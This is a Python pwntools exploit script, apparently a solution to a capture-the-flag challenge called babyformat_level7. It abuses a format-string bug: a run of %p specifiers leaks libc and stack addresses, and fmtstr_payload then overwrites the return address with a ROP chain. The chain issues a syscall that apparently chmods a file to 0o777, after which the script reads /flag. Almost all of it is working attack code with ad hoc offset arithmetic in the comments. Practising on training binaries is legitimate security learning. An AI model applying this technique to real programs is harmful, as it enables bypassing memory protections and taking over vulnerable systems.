#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level7
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level7')
context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# io = start()

def f(p4):
    print("\n")
    counter = 0
    # count = p4.count(b"$")
    # print("count is", count)
    exploit_break = p4.split(b'$')
    # print(exploit_break[-1])
    new_exploit = b''
    # new_exploit = b'A'*111
    # new_exploit = b'A'*72 #payload difference was 72
    
    # total removed from original = 111
    # total A in original = 35
    # extra added in new payload = %c * 66 = 132
    # extra added 132 - 111 = 21 
    # total A in modified = 35
    # total char original = 35 + x
    # total char modified = 35 + x - 66

   # case 2
   # removed chars = 116
   # %c 70 times = 140
   # diff = 140 - 116 = 24 additiona chars to remove

   # case 3
   # removed chars = 140
   # %c 94 times = 188
   # diff = 188 - 140 = 48 additiona chars to remove
    for i in range(len(exploit_break) - 1):
        counter += 1
        x = exploit_break[i]
        # print("counter value ",counter, x)
        # print(x)
        y = x.split(b'%')
        # print("yyyyyyy",y)
        if len(y) > 2:
            y1 = y[0]
            y2 = y[1]
            y3 = y[2]
            # print(y1, y2, y3)
            #case 2
            # k = 26   # 19, 24

            #case 3
            k = 48
           
            if i == 0:
                len_A_old_payload = len(y1)
                print(f"len_A_old_payload : {len_A_old_payload}")
                c_val = int(y2[:-1].decode())
                print(f"c_val old payload : {c_val}")
                print(f"A and c_val sum old payload : {len_A_old_payload+c_val}\n")
                new_exploit += y1[k:]
                len_A_new_payload = len(y1[k:])
                print(f"len_A_new_payload : {len_A_new_payload}")
                # offset = (int(y3.decode())-1)
                # print("offset ", offset)
                c_count =  (int(y3.decode())-2)
                print(f"%c count : {c_count}")
                new_exploit += ('%c'* c_count).encode()
                z = y2[:-1]
                z1_bytes= b''
                z1 = (int(z.decode())) - c_count + k
                z1_str = str(z1)
                z1_bytes += z1_str.encode()
                new_y = b"%"+z1_bytes+b'c'+b"%"

                print(f"new payload A %c %xc sum {len_A_new_payload+c_count+z1}\n")
            else:
                new_y = y1+b"%"+y2+b"%"
            # print(new_y)
            # new_ex = x.replace(b'$', b'')
            # new_exploit += new_ex
            new_exploit += new_y
        else:
            new_exploit += y1  + b'%'   

    new_exploit += exploit_break[-1]

    # print("counter is ",counter)
    print("old payload length", len(p4))
    print("new payload length", len(new_exploit))
    print("old payload ")
    print(p4)
    diff = len(p4) - len(new_exploit)
    print("old payload and new payload length difference", diff)
    # ret_exploit = b'A'*diff + new_exploit
    # print("new payload length", len(ret_exploit))
    print("new payload ")
    print(new_exploit)
    return new_exploit

def f2():
    io = start()
    exploit = f'%p'+' %p'*159
    print("payload 1 start")
    payload = exploit.encode()  
    io.recvuntil(b'read your input again.')
    io.sendline(payload)
    print("payload 1 send")
    io.recvuntil(b"Your input is:")
    io.recvline()
    print("received bytes after payload 1 sent")
    leak_bytes = io.recvline(keepends=False)
    leak = leak_bytes.decode().split(' ')

    leaked_libc_func_int = int(leak[0], 16)
    libc_base = leaked_libc_func_int - 0x1ed723
    print(f"libc_base : 0x{libc_base:x}")

    leaked_rbp = leak[156]
    rbp_main = int(leaked_rbp, 16)  
    rbp_main_updated = rbp_main - 264  
    print(f"rbp_main_updated : 0x{rbp_main_updated:x}")
    rbp_func = rbp_main - 344 
    print(f"leaked rbp func : {hex(rbp_func)}")
    leaked_ret = rbp_func + 8
    rip_func_addr = leaked_ret
    print(f"leaked rip func : {hex(leaked_ret)}")

    rsp_func=rbp_func-1184 
    print(f"leaked rsp_func : 0x{rsp_func:x}")

    # leaked_current_instruction = int(leak[154], 16) - 382
    # print(f"leaked_current_instruction : 0x{leaked_current_instruction:x}")
    # print(f"rip and rsp diff func in block : {(rip_func_addr - rsp_func)/8}")
    # print(f"canary in block : {(rbp_func - rsp_func - 8)/8}")

    # leaked_canary = int(leak[150], 16)  
    # print(f"leaked_canary : 0x{leaked_canary:x}")

    base = libc_base
    rip_func = rip_func_addr
    pop_rdi = base+0x23b6a 
    pop_rsi = base+0x2601f 
    pop_rdx = base+0x142c92 
    pop_rax = base+0x36174  
    syscall = base+0x2284d  

    # print("2nd payload start")
    # b"A"*3, numbwritten=64 - original calculation
    # for 35, 96 %xc > %y$

    # total_dollar = 33 + 3 #36
    # digit_2_cahrs = 33*2 #66
    # digit_3_chars = 3 *3 #9
    # total_removed_chars = 111
    # 3 + 112 = 115, 64 + 112 = 176
    # (3, 64) (11, 72) (19, 80) (27, 88) (35, 96) (43, 104) (51, 112) (59, 120)

    # case 2
    # total_dollar = 28 + 8 #36
    # digit_2_cahrs = (99-72+1)*2 # 28*2 #56
    # digit_3_chars = (107-100+1)*3 # 8*3 #24
    # total_removed_chars = 36+56+24 #116

    fmt = {
        rip_func : p64(pop_rdi).ljust(8, b"\x00"),
        rip_func + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
        rip_func + 16 : p64(pop_rsi).ljust(8, b"\x00"),
        rip_func + 24 : p64(0o777),
        rip_func + 32 : p64(pop_rdx).ljust(8, b"\x00"),
        rip_func + 40 : p64(0),
        rip_func + 48 : p64(pop_rax).ljust(8, b"\x00"),
        rip_func + 56 : p64(0x5a),
        rip_func + 64 : p64(syscall).ljust(8, b"\x00")
    }
    #case2
    # p4 = b"A"*(3+32) + fmtstr_payload(30+4,fmt, numbwritten=64+32,  write_size='short', strategy='fast')

    # case3
    total_dollar = 4 + 32 #36
    digit_2_cahrs = (99-96+1)*2 # 4*2 #8
    digit_3_chars = (131-100+1)*3 # 32*3 #96
    total_removed_chars = 36+8+96 # 140
    p4 = b"A"*(3+200) + fmtstr_payload(30+25,fmt, numbwritten=64+200,  write_size='short', strategy='fast')

    new_exploit = f(p4)
    # new_exploit = p4
    print("\n")
    # print(new_exploit)
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    # io.recvuntil(b"then exit.")
    io.sendline(new_exploit)
    # try:
    #     io.sendline(p2)
    # except:
    #     print("An exception occured at ")  
    print("2nd payload end")
    system("cat /flag")
    system("cat /flag")
    io.interactive()

# f2()

for i in range(1):
    print("f2 call ", i)
    f2()